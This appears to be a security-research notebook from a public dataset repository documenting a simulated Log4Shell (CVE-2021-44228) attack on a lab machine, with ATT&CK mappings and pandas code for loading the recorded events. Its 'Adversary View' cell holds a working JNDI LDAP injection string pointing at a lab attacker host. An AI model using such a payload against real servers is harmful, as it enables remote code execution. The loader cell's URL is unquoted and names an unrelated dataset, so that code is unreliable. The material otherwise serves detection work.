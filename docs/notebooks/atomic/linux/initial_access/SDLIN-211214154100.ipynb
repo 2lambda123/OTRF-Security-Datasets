{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "4b740ccd",
   "metadata": {},
   "source": [
    "# Log4jShell LDAP JNDI Lookup"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "73ec7025",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "191d0573",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2021/12/14 |\n",
    "| Modification Date | 2021/12/14 |\n",
    "| Tactics           | [TA0001](https://attack.mitre.org/tactics/TA0001),[TA0002](https://attack.mitre.org/tactics/TA0002) |\n",
    "| Techniques        | [T1190](https://attack.mitre.org/techniques/T1190),[T1203](https://attack.mitre.org/techniques/T1203) |\n",
    "| Tags              | None |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c2a3136c",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "The JNDI lookup feature of log4j allows variables to be retrieved via JNDI - Java Naming and Directory Interface. This is an API that that provides naming and directory functionality to Java applications."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "da6112bc",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7ce16595",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Network | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/linux/initial_access/network/log4jshell_reversheshell_netcat.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/linux/initial_access/network/log4jshell_reversheshell_netcat.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5935ca63",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7fafc4ab",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4f40fcb6",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| Manual | sh | [sh](https://github.com/OTRF/Microsoft-Sentinel2Go/tree/master/grocery-list/Linux/demos/CVE-2021-44228-Log4Shell) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "526385dd",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "java -cp target/Log4jLabProject-1.0-SNAPSHOT-all.jar com.log4jshell.App '${jndi:ldap://192.168.2.6:1389/Run}'\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2363a776",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0c8474b6",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c2594cba",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/linux/defense_evasion/host/sh_binary_padding_dd.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "11c935b9",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ef106eac",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ea40c9d5",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0f0acb55",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.head(1)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "776cc6f1",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://isc.sans.edu/diary/RCE+in+log4j%2C+Log4Shell%2C+or+how+things+can+get+bad+quickly/28120](https://isc.sans.edu/diary/RCE+in+log4j%2C+Log4Shell%2C+or+how+things+can+get+bad+quickly/28120) \n",
    "* [https://github.com/OTRF/Microsoft-Sentinel2Go/tree/master/grocery-list/Linux/demos/CVE-2021-44228-Log4Shell](https://github.com/OTRF/Microsoft-Sentinel2Go/tree/master/grocery-list/Linux/demos/CVE-2021-44228-Log4Shell) \n",
    "* [https://github.com/Cyb3rWard0g/log4jshell-lab](https://github.com/Cyb3rWard0g/log4jshell-lab) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
